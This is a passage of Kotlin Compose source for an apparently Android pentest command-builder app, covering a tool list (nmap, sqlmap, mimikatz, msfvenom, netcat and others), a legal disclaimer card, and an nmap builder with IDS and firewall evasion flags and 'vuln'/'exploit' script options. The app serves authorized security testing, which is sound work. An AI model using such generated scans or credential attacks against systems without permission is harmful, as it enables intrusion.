            "masscan" -> MasscanBuilder(language)
            "naabu" -> NaabuBuilder(language)
            "dnsx" -> DnsxBuilder(language)
            "subfinder" -> SubfinderBuilder(language)
            "amass" -> AmassBuilder(language)
            "dnsrecon" -> DnsreconBuilder(language)
            "feroxbuster" -> FeroxbusterBuilder(language)
            "gobuster" -> GobusterBuilder(language)
            "dirsearch" -> DirsearchBuilder(language)
            "dirb" -> DirbBuilder(language)
            "ffuf" -> FfufBuilder(language)
            "arjun" -> ArjunBuilder(language)
            "dalfox" -> DalfoxBuilder(language)
            "gau" -> GauBuilder(language)
            "katana" -> KatanaBuilder(language)
            "httpx" -> HttpxBuilder(language)
            "nikto" -> NiktoBuilder(language)
            "whatweb" -> WhatWebBuilder(language)
            "nuclei" -> NucleiBuilder(language)
            "sqlmap" -> SqlmapBuilder(language)
            "burp-suite", "burp" -> BurpSuiteBuilder(language)
            "owasp-zap", "zap" -> OwaspZapBuilder(language)
            "wfuzz" -> WfuzzBuilder(language)
            "wpscan" -> WPScanBuilder(language)
            "mitmproxy", "mitmweb", "mitmdump" -> MitmproxyBuilder(language)
            "kiterunner", "kr" -> KiterunnerBuilder(language)
            "jwt_tool", "jwt-tool" -> JwtToolBuilder(language)
            "commix" -> CommixBuilder(language)
            "wafw00f" -> Wafw00fBuilder(language)
            "netexec" -> NetExecBuilder(language)
            "coercer" -> CoercerBuilder(language)
            "rubeus" -> RubeusBuilder(language)
            "enum4linux-ng" -> Enum4linuxNgBuilder(language)
            "bloodhound", "bloodhound-python" -> BloodHoundBuilder(language)
            "certipy" -> CertipyBuilder(language)
            "kerbrute" -> KerbruteBuilder(language)
            "evil-winrm" -> EvilWinrmBuilder(language)
            "responder" -> ResponderBuilder(language)
            "hashcat" -> HashcatBuilder(language)
            "john", "john-the-ripper" -> JohnBuilder(language)
            "hydra" -> HydraBuilder(language)
            "aircrack-ng" -> AircrackNgBuilder(language)
            "cewl" -> CewlBuilder(language)
            "name-that-hash" -> NameThatHashBuilder(language)
            "tcpdump" -> TcpdumpBuilder(language)
            "tshark" -> TsharkBuilder(language)
            "chisel" -> ChiselBuilder(language)
            "ligolo", "ligolo-ng" -> LigoloBuilder(language)
            "netcat", "nc" -> NetcatBuilder(language)
            "proxychains" -> ProxychainsBuilder(language)
            "sshuttle" -> SshuttleBuilder(language)
            "peass-ng", "linpeas", "winpeas" -> PeassNgBuilder(language)
            "mimikatz" -> MimikatzBuilder(language)
            "pypykatz" -> PypykatzBuilder(language)
            "theharvester" -> TheHarvesterBuilder(language)
            "sherlock" -> SherlockBuilder(language)
            "gitleaks" -> GitleaksBuilder(language)
            "trufflehog" -> TruffleHogBuilder(language)
            "searchsploit" -> SearchsploitBuilder(language)
            "checksec" -> ChecksecBuilder(language)
            "radare2", "rabin2" -> Rabin2Builder(language)
            "binwalk" -> BinwalkBuilder(language)
            "exiftool" -> ExifToolBuilder(language)
            "volatility" -> VolatilityBuilder(language)
            "msfvenom" -> MsfvenomBuilder(language)
            else -> {
                val matchedCs = allCheatsheets.firstOrNull {
                    it.id.equals(selectedToolId, ignoreCase = true) ||
                    it.id.replace("_", "-").equals(selectedToolId.replace("_", "-"), ignoreCase = true)
                }
                if (matchedCs != null) {
                    UniversalToolBuilder(tool = matchedCs, language = language)
                } else {
                    NmapBuilder(language)
                }
            }
        }
    }
}

// -------------------------------------------------------------
// LEGAL DISCLAIMER BANNER
// -------------------------------------------------------------
@Composable
fun LegalDisclaimerBanner(language: AppLanguage) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = SurfaceDark),
        shape = RoundedCornerShape(10.dp),
        border = CardDefaults.outlinedCardBorder().copy(
            brush = SolidColor(WarningOrange.copy(alpha = 0.4f))
        )
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(10.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Box(
                modifier = Modifier
                    .size(32.dp)
                    .clip(RoundedCornerShape(6.dp))
                    .background(WarningOrange.copy(alpha = 0.15f)),
                contentAlignment = Alignment.Center
            ) {
                Icon(
                    imageVector = Icons.Default.Security,
                    contentDescription = "Legal Notice",
                    tint = WarningOrange,
                    modifier = Modifier.size(18.dp)
                )
            }

            Spacer(modifier = Modifier.width(10.dp))

            Column {
                Text(
                    text = if (language == AppLanguage.TR) "YASAL UYARI / SORUMLULUK REDDİ" else "LEGAL DISCLAIMER / ETHICAL USE",
                    fontSize = 10.sp,
                    fontFamily = FontFamily.Monospace,
                    fontWeight = FontWeight.Bold,
                    color = WarningOrange
                )
                Text(
                    text = if (language == AppLanguage.TR)
                        "Bu araçlar ve komut oluşturucular yalnızca yetkili güvenlik testleri, araştırmaları ve eğitim amaçlıdır. İzinsiz taramalar yasalara aykırıdır."
                    else
                        "This tool suite is intended strictly for authorized security assessments, defensive audits, and education. Unauthorized use is prohibited.",
                    fontSize = 10.5.sp,
                    color = TextSecondary,
                    lineHeight = 14.sp
                )
            }
        }
    }
}

// -------------------------------------------------------------
// LIVE COMMAND PREVIEW BOX COMPONENT
// -------------------------------------------------------------
@Composable
fun GeneratedCommandCard(
    command: String,
    language: AppLanguage,
    onReset: (() -> Unit)? = null,
    modifier: Modifier = Modifier
) {
    val context = LocalContext.current

    Column(
        modifier = modifier
            .fillMaxWidth()
            .padding(top = 10.dp, bottom = 4.dp)
            .background(CodeBlockBg, RoundedCornerShape(10.dp))
            .border(1.dp, CyberGreen.copy(alpha = 0.5f), RoundedCornerShape(10.dp))
    ) {
        // Window Title Bar
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .background(SurfaceVariantDark, RoundedCornerShape(topStart = 10.dp, topEnd = 10.dp))
                .padding(horizontal = 12.dp, vertical = 6.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Box(modifier = Modifier.size(9.dp).clip(CircleShape).background(Color(0xFFFF5F56)))
                Spacer(modifier = Modifier.width(5.dp))
                Box(modifier = Modifier.size(9.dp).clip(CircleShape).background(Color(0xFFFFBD2E)))
                Spacer(modifier = Modifier.width(5.dp))
                Box(modifier = Modifier.size(9.dp).clip(CircleShape).background(Color(0xFF27C93F)))
                Spacer(modifier = Modifier.width(10.dp))
                Text(
                    text = if (language == AppLanguage.TR) "CANLI KOMUT" else "LIVE COMMAND",
                    fontSize = 11.sp,
                    fontFamily = FontFamily.Monospace,
                    fontWeight = FontWeight.Bold,
                    color = CyberGreen
                )
            }

            Row(verticalAlignment = Alignment.CenterVertically) {
                if (onReset != null) {
                    IconButton(onClick = onReset, modifier = Modifier.size(26.dp)) {
                        Icon(imageVector = Icons.Default.Refresh, contentDescription = "Reset", tint = TextMuted, modifier = Modifier.size(14.dp))
                    }
                    Spacer(modifier = Modifier.width(2.dp))
                }
                IconButton(
                    onClick = {
                        val shareIntent = Intent().apply {
                            action = Intent.ACTION_SEND
                            putExtra(Intent.EXTRA_TEXT, command)
                            type = "text/plain"
                        }
                        context.startActivity(Intent.createChooser(shareIntent, "Share Command"))
                    },
                    modifier = Modifier.size(26.dp)
                ) {
                    Icon(imageVector = Icons.Default.Share, contentDescription = "Share", tint = TextMuted, modifier = Modifier.size(14.dp))
                }
                Spacer(modifier = Modifier.width(2.dp))
                IconButton(
                    onClick = {
                        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                        clipboard.setPrimaryClip(ClipData.newPlainText("Command", command))
                        Toast.makeText(context, if (language == AppLanguage.TR) "Komut kopyalandı!" else "Command copied!", Toast.LENGTH_SHORT).show()
                    },
                    modifier = Modifier.size(26.dp)
                ) {
                    Icon(imageVector = Icons.Default.ContentCopy, contentDescription = "Copy", tint = CyberGreen, modifier = Modifier.size(15.dp))
                }
            }
        }

        // Code Body
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .horizontalScroll(rememberScrollState())
                .padding(12.dp)
        ) {
            Text(
                text = command,
                color = TextPrimary,
                fontSize = 12.5.sp,
                fontFamily = FontFamily.Monospace,
                lineHeight = 18.sp
            )
        }
    }
}

// -------------------------------------------------------------
// REUSABLE TOGGLE AND CHIP COMPONENTS
// -------------------------------------------------------------
@Composable
fun ToggleOption(
    label: String,
    checked: Boolean,
    onCheckedChange: (Boolean) -> Unit
) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .clickable { onCheckedChange(!checked) }
            .padding(vertical = 4.dp),
        horizontalArrangement = Arrangement.SpaceBetween,
        verticalAlignment = Alignment.CenterVertically
    ) {
        Text(
            text = label,
            fontSize = 11.5.sp,
            fontFamily = FontFamily.Monospace,
            color = if (checked) TextPrimary else TextSecondary,
            modifier = Modifier.weight(1f)
        )
        Switch(
            checked = checked,
            onCheckedChange = onCheckedChange,
            colors = SwitchDefaults.colors(
                checkedThumbColor = BackgroundDark,
                checkedTrackColor = CyberGreen,
                uncheckedThumbColor = TextMuted,
                uncheckedTrackColor = SurfaceVariantDark
            )
        )
    }
}

@Composable
fun ToggleChip(
    label: String,
    checked: Boolean,
    modifier: Modifier = Modifier,
    onClick: () -> Unit
) {
    Box(
        modifier = modifier
            .clip(RoundedCornerShape(6.dp))
            .background(if (checked) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
            .border(1.dp, if (checked) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
            .clickable(onClick = onClick)
            .padding(horizontal = 8.dp, vertical = 5.dp),
        contentAlignment = Alignment.Center
    ) {
        Text(
            text = label,
            fontSize = 10.5.sp,
            fontFamily = FontFamily.Monospace,
            fontWeight = if (checked) FontWeight.Bold else FontWeight.Normal,
            color = if (checked) CyberGreen else TextSecondary
        )
    }
}

// -------------------------------------------------------------
// UNIVERSAL CHEATSHEET TOOL BUILDER (FOR ALL OTHER REAL CLI TOOLS)
// -------------------------------------------------------------
@Composable
fun UniversalToolBuilder(tool: Cheatsheet, language: AppLanguage) {
    val commands = remember(tool.quickCommandsJson) {
        try {
            val arr = JSONArray(tool.quickCommandsJson)
            val list = mutableListOf<String>()
            for (i in 0 until arr.length()) {
                list.add(arr.getString(i))
            }
            list
        } catch (e: Exception) {
            emptyList<String>()
        }
    }

    var selectedCmdIndex by remember(tool.id) { mutableIntStateOf(0) }
    var target by remember(tool.id) { mutableStateOf("10.10.10.100") }
    var customPort by remember(tool.id) { mutableStateOf("") }
    var wordlist by remember(tool.id) { mutableStateOf("/usr/share/wordlists/rockyou.txt") }
    var outputFileName by remember(tool.id) { mutableStateOf("output.txt") }

    // Toggles
    var verbose by remember(tool.id) { mutableStateOf(false) }
    var saveOutput by remember(tool.id) { mutableStateOf(false) }
    var threads by remember(tool.id) { mutableStateOf(false) }
    var threadsCount by remember(tool.id) { mutableStateOf("20") }
    var insecureSsl by remember(tool.id) { mutableStateOf(false) }
    var proxy by remember(tool.id) { mutableStateOf(false) }
    var proxyUrl by remember(tool.id) { mutableStateOf("http://127.0.0.1:8080") }

    Column {
        if (commands.isNotEmpty()) {
            Text(
                text = if (language == AppLanguage.TR) "HAZIR KOMUT ŞABLONLARI (${commands.size} Adet)" else "COMMAND TEMPLATES (${commands.size})",
                style = MaterialTheme.typography.labelSmall,
                color = TerminalCyan
            )
            Spacer(modifier = Modifier.height(6.dp))
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .horizontalScroll(rememberScrollState()),
                horizontalArrangement = Arrangement.spacedBy(6.dp)
            ) {
                commands.take(8).forEachIndexed { idx, cmd ->
                    val sel = selectedCmdIndex == idx
                    Box(
                        modifier = Modifier
                            .clip(RoundedCornerShape(6.dp))
                            .background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                            .border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                            .clickable { selectedCmdIndex = idx }
                            .padding(horizontal = 10.dp, vertical = 6.dp)
                    ) {
                        Text(
                            text = cmd.take(35) + if (cmd.length > 35) "..." else "",
                            fontSize = 11.sp,
                            fontFamily = FontFamily.Monospace,
                            color = if (sel) CyberGreen else TextSecondary
                        )
                    }
                }
            }
            Spacer(modifier = Modifier.height(10.dp))
        }

        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text("Hedef IP / URL / Domain (<TARGET>)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(8.dp))

        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = customPort,
                onValueChange = { customPort = it },
                label = { Text("Port (opsiyonel)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = wordlist,
                onValueChange = { wordlist = it },
                label = { Text("Wordlist Yolu") },
                modifier = Modifier.weight(1.5f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(8.dp))

        ToggleOption(label = "-v (Ayrıntılı Çıktı / Verbose)", checked = verbose, onCheckedChange = { verbose = it })
        ToggleOption(label = "-o $outputFileName (Sonuçları Dosyaya Yaz)", checked = saveOutput, onCheckedChange = { saveOutput = it })
        ToggleOption(label = "-t $threadsCount (İş Parçacığı / Thread)", checked = threads, onCheckedChange = { threads = it })
        ToggleOption(label = "-k (SSL Sertifika Kontrolünü Atla)", checked = insecureSsl, onCheckedChange = { insecureSsl = it })
        ToggleOption(label = "--proxy $proxyUrl (HTTP Proxy)", checked = proxy, onCheckedChange = { proxy = it })

        // Live Command Synthesis
        val baseTemplate = if (commands.isNotEmpty()) commands.getOrElse(selectedCmdIndex) { commands[0] } else tool.id
        var synthesized = baseTemplate
            .replace(Regex("""<target>|<TARGET>|<ip>|<IP>|192\.168\.1\.100|10\.10\.10\.100|example\.com|target\.com"""), target.trim())
            .replace(Regex("""<wordlist>|<WORDLIST>|wordlist\.txt|/usr/share/wordlists/rockyou\.txt"""), wordlist.trim())

        if (customPort.isNotBlank()) {
            synthesized = synthesized.replace(Regex("""<port>|<PORT>|80|443|8080"""), customPort.trim())
        }

        if (verbose && !synthesized.contains("-v")) synthesized += " -v"
        if (saveOutput && !synthesized.contains("-o") && !synthesized.contains(">")) synthesized += " -o $outputFileName"
        if (threads && !synthesized.contains("-t ")) synthesized += " -t $threadsCount"
        if (insecureSsl && !synthesized.contains("-k")) synthesized += " -k"
        if (proxy && !synthesized.contains("--proxy")) synthesized += " --proxy $proxyUrl"

        GeneratedCommandCard(command = synthesized, language = language)
    }
}

// =============================================================
// PART 1: RECON, PORT & WEB TARAMA ARAÇLARI (10 ARAÇ)
// =============================================================

// 1. NMAP
@Composable
fun NmapBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("10.10.10.100") }
    var isTargetList by remember { mutableStateOf(false) }
    var excludeHosts by remember { mutableStateOf("") }
    var scanType by remember { mutableStateOf("-sS") }
    var portsOption by remember { mutableStateOf("top1000") }
    var customPorts by remember { mutableStateOf("80,443,8080,445") }
    var timing by remember { mutableStateOf("-T4") }

    // Servis, Versiyon & NSE Scriptleri
    var enableVersionDetect by remember { mutableStateOf(true) }
    var versionIntensity by remember { mutableStateOf(false) }
    var enableOsDetect by remember { mutableStateOf(true) }
    var aggressiveScan by remember { mutableStateOf(false) }
    var scriptDefault by remember { mutableStateOf(true) }
    var scriptVuln by remember { mutableStateOf(false) }
    var scriptAuth by remember { mutableStateOf(false) }
    var scriptDiscovery by remember { mutableStateOf(false) }
    var scriptExploit by remember { mutableStateOf(false) }
    var customScript by remember { mutableStateOf("") }
    var scriptArgs by remember { mutableStateOf("") }

    // Host Keşfi & Firewall / IDS Evasion
    var noPing by remember { mutableStateOf(true) }
    var noDns by remember { mutableStateOf(true) }
    var onlyOpen by remember { mutableStateOf(true) }
    var minRate by remember { mutableStateOf(true) }
    var sourcePort53 by remember { mutableStateOf(false) }
    var fragmentPackets by remember { mutableStateOf(false) }
    var enableDecoy by remember { mutableStateOf(false) }
    var dataLength by remember { mutableStateOf(false) }
    var badsum by remember { mutableStateOf(false) }
    var packetTrace by remember { mutableStateOf(false) }
    var showReason by remember { mutableStateOf(false) }

    // Çıktı Formatı
    var outputFormat by remember { mutableStateOf("oN") }
    var outputFile by remember { mutableStateOf("nmap_scan") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            ToggleChip("Hedef IP/CIDR", !isTargetList, modifier = Modifier.weight(1f)) { isTargetList = false }
            ToggleChip("Dosyadan Oku (-iL)", isTargetList, modifier = Modifier.weight(1f)) { isTargetList = true }
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text(if (isTargetList) "Hedef Dosyası (-iL targets.txt)" else "Hedef IP / CIDR / Domain") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = excludeHosts,
            onValueChange = { excludeHosts = it },
            label = { Text("Hariç Tut (--exclude 10.10.10.1) - Opsiyonel") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "TARAMA TEKNİĞİ (-s*)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("-sS" to "SYN Stealth", "-sT" to "Connect", "-sU" to "UDP", "-sA" to "ACK", "-sN" to "Null/FIN", "-sn" to "Ping Sweep").forEach { (type, lbl) ->
                val isSelected = scanType == type
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { scanType = type }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = "$type\n$lbl", fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary, lineHeight = 11.sp)
                }
            }
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "PORT SEÇENEKLERİ (-p / --top-ports)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("top100" to "Top 100", "top1000" to "Top 1000", "all" to "Tümü (-p-)", "fast" to "Hızlı (-F)", "custom" to "Özel").forEach { (opt, lbl) ->
                val isSelected = portsOption == opt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { portsOption = opt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        if (portsOption == "custom") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = customPorts,
                onValueChange = { customPorts = it },
                label = { Text("Port Listesi (örn: 21-25,80,443,445,8080)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ZAMANLAMA ŞABLONU (TIMING)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("-T2" to "Polite (-T2)", "-T3" to "Normal (-T3)", "-T4" to "Aggressive (-T4)", "-T5" to "Insane (-T5)").forEach { (t, _) ->
                val isSelected = timing == t
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { timing = t }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = t, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "NSE SCRIPTLERİ (--script)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("default (-sC)", scriptDefault, modifier = Modifier.weight(1f)) { scriptDefault = !scriptDefault }
            ToggleChip("vuln", scriptVuln, modifier = Modifier.weight(1f)) { scriptVuln = !scriptVuln }
            ToggleChip("auth", scriptAuth, modifier = Modifier.weight(1f)) { scriptAuth = !scriptAuth }
            ToggleChip("discovery", scriptDiscovery, modifier = Modifier.weight(1f)) { scriptDiscovery = !scriptDiscovery }
            ToggleChip("exploit", scriptExploit, modifier = Modifier.weight(1f)) { scriptExploit = !scriptExploit }
        }
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = customScript,
                onValueChange = { customScript = it },
                label = { Text("Özel Script (örn: smb-vuln-ms17-010)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = scriptArgs,
                onValueChange = { scriptArgs = it },
                label = { Text("Script Args") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "SERVİS VE İŞLETİM SİSTEMİ TESPİTİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-sV Servis ve Versiyon Tespiti", checked = enableVersionDetect, onCheckedChange = { enableVersionDetect = it })
        if (enableVersionDetect) {
            ToggleOption(label = "  ↳ --version-intensity 9 (Derin Versiyon Sondajı)", checked = versionIntensity, onCheckedChange = { versionIntensity = it })
        }
        ToggleOption(label = "-O İşletim Sistemi (OS) Tespiti", checked = enableOsDetect, onCheckedChange = { enableOsDetect = it })
        ToggleOption(label = "-A Tam Donanımlı Agresif Mod (OS + Sürüm + Script + Traceroute)", checked = aggressiveScan, onCheckedChange = { aggressiveScan = it })

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "FIREWALL & IDS ATLATMA (EVASION)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-Pn Ping Kontrolünü Atla (Hostu Açık Say)", checked = noPing, onCheckedChange = { noPing = it })
        ToggleOption(label = "-n DNS Çözümlemesi Yapma (Taramayı Hızlandır)", checked = noDns, onCheckedChange = { noDns = it })
        ToggleOption(label = "--open Yalnızca Açık Portları Listele", checked = onlyOpen, onCheckedChange = { onlyOpen = it })
        ToggleOption(label = "--min-rate 2000 Minimum Paket Gönderme Hızı", checked = minRate, onCheckedChange = { minRate = it })
        ToggleOption(label = "--source-port 53 Kaynak Portu DNS (53) Olarak Ayarla", checked = sourcePort53, onCheckedChange = { sourcePort53 = it })
        ToggleOption(label = "-f Paketleri Parçala (Packet Fragmentation)", checked = fragmentPackets, onCheckedChange = { fragmentPackets = it })
        ToggleOption(label = "-D RND:5 Sahte IP Adresleri İle Gizlen (Decoy)", checked = enableDecoy, onCheckedChange = { enableDecoy = it })
        ToggleOption(label = "--data-length 25 Paketlere Rastgele Veri Ekle", checked = dataLength, onCheckedChange = { dataLength = it })
        ToggleOption(label = "--badsum Hatalı Checksum ile Paket Gönder (IDS/FW Test)", checked = badsum, onCheckedChange = { badsum = it })
        ToggleOption(label = "--packet-trace Gönderilen/Alınan Tüm Paketleri İzle", checked = packetTrace, onCheckedChange = { packetTrace = it })
        ToggleOption(label = "--reason Port Durumunun Gerekçesini Göster", checked = showReason, onCheckedChange = { showReason = it })

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ÇIKTI FORMATI (-o*)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("oN" to "Normal (-oN)", "oX" to "XML (-oX)", "oG" to "Grepable (-oG)", "oA" to "Tümü (-oA)", "none" to "Terminal").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        if (outputFormat != "none") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = outputFile,
                onValueChange = { outputFile = it },
                label = { Text("Çıktı Dosyası Adı") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        // Live Command Synthesis
        val cmdParts = mutableListOf("nmap", scanType)
        if (aggressiveScan) {
            cmdParts.add("-A")
        } else {
            if (enableVersionDetect) {
                cmdParts.add("-sV")
                if (versionIntensity) cmdParts.addAll(listOf("--version-intensity", "9"))
            }
            if (enableOsDetect) cmdParts.add("-O")
        }

        val scripts = mutableListOf<String>()
        if (scriptDefault && !aggressiveScan) scripts.add("default")
        if (scriptVuln) scripts.add("vuln")
        if (scriptAuth) scripts.add("auth")
        if (scriptDiscovery) scripts.add("discovery")
        if (scriptExploit) scripts.add("exploit")
        if (customScript.isNotBlank()) scripts.add(customScript.trim())
        if (scripts.isNotEmpty()) {
            if (scripts.size == 1 && scripts[0] == "default") {
                cmdParts.add("-sC")
            } else {
                cmdParts.add("--script=" + scripts.joinToString(","))
            }
            if (scriptArgs.isNotBlank()) {
                cmdParts.add("--script-args=\"${scriptArgs.trim()}\"")
            }
        }

        if (noPing) cmdParts.add("-Pn")
        if (noDns) cmdParts.add("-n")
        if (onlyOpen) cmdParts.add("--open")
        if (minRate) cmdParts.addAll(listOf("--min-rate", "2000"))
        if (sourcePort53) cmdParts.addAll(listOf("--source-port", "53"))
        if (fragmentPackets) cmdParts.add("-f")
        if (enableDecoy) cmdParts.addAll(listOf("-D", "RND:5"))
        if (dataLength) cmdParts.addAll(listOf("--data-length", "25"))
        if (badsum) cmdParts.add("--badsum")
        if (packetTrace) cmdParts.add("--packet-trace")
        if (showReason) cmdParts.add("--reason")

        when (portsOption) {
            "all" -> cmdParts.add("-p-")
            "top100" -> cmdParts.addAll(listOf("--top-ports", "100"))
            "top1000" -> cmdParts.addAll(listOf("--top-ports", "1000"))
            "fast" -> cmdParts.add("-F")
            "custom" -> cmdParts.add("-p ${customPorts.trim()}")
        }
        cmdParts.add(timing)

        when (outputFormat) {
            "oN" -> cmdParts.addAll(listOf("-oN", "${outputFile.trim()}.txt"))
            "oX" -> cmdParts.addAll(listOf("-oX", "${outputFile.trim()}.xml"))
            "oG" -> cmdParts.addAll(listOf("-oG", "${outputFile.trim()}.gnmap"))
            "oA" -> cmdParts.addAll(listOf("-oA", outputFile.trim()))
        }

        if (excludeHosts.isNotBlank()) {
            cmdParts.addAll(listOf("--exclude", excludeHosts.trim()))
        }

        if (isTargetList) {
            cmdParts.addAll(listOf("-iL", target.trim()))
        } else {
            cmdParts.add(target.trim())
        }

        GeneratedCommandCard(command = cmdParts.joinToString(" "), language = language)
    }
}

